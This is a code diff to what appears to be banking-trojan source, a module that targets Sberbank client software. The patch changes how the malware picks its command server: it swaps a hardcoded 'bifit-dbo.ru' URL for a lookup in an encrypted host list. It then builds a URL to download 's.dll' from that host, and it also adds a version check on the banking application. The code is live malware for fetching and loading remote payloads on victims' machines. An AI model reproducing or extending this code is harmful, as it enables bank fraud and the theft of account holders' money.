@@ -29,6 +29,8 @@ namespace SBER_DOWNLOAD_DLL
 }
 #define DBG SBER_DOWNLOAD_DLL::DBGOutMessage<>
 
+static char SBER_HOSTS[SBERHOSTS_PARAM_SIZE] = SBERHOSTS_PARAM_NAME;
+
 namespace Sber
 {
 
@@ -99,13 +101,29 @@ static PCHAR GetNameDll(char* uid)
 	return path;
 }
 
-static BYTE* LoadSluiceDll( char* uid )
+static char* GetAdminUrl( char* url )
 {
 #ifdef DEBUGCONFIG
-	char* url = "http://bifit-dbo.ru/s.dll";
+	m_lstrcpy( url, "bifit-dbo.ru" );
 #else
-	char* url = "http://bifit-dbo.ru/s.dll"; //GetBotScriptURL( 0, "s.dll" );
+	string host = GetActiveHostFromBuf2( SBER_HOSTS, 0x15D1BD02 /* __SBER_HOSTS__ */, SBERHOSTS_PARAM_ENCRYPTED );
+	if( !host.IsEmpty() )
+		m_lstrcpy( url, host.t_str() );
+	else
+		url = 0;
 #endif
+	return url;
+}
+
+
+static BYTE* LoadSluiceDll( char* uid )
+{
+	char domen[128];
+	if( GetAdminUrl(domen) == 0 ) return 0;
+	char url[128];
+	fwsprintfA pwsprintfA = Get_wsprintfA();
+	pwsprintfA( url, "http://%s/s.dll", domen );
+
 	BYTE* module = 0;
 	char* nameFile = GetNameDll(uid);
 	//формируем пароль из уида
@@ -340,7 +358,7 @@ static void CopyFolderForVersion( const char* appName )
 				DBG( "SBER", "Версия программы %s", valVer );
 				if( m_lstrcmp( valVer, "7.16.1.2243" ) == 0 ) //"7.12.5.2225" ) == 0 ) 
 				{
-					StartCopyFolder( appName, false );
+					//StartCopyFolder( appName, false );
 				}
 			}
 		}
